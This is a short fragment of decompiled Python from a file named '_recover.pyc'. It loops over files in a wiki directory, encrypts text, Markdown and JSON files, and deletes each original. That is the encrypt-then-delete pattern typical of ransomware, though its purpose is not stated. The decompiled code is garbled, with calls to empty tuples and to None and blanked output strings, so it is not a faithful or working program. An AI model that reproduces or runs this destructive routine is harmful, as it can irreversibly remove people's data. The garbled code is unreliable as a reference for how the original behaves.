# Source Generated with Decompyle++
# File: _recover.pyc (Python 3.13)

for f in ()(WIKI_DIR.rglob('*')):
    if not ()(WIKI_DIR.rglob('*'))():
        pass
    if not f.suffix in ('.md', '.json', '.txt'):
        pass
    if f.suffix == '.enc':
        pass
    enc_path = encrypt_file(f)
    None(f'''  Encrypted:  → ''')
    f.unlink()
    count += 1
    None(f'''  Total:  files encrypted''')
    return count
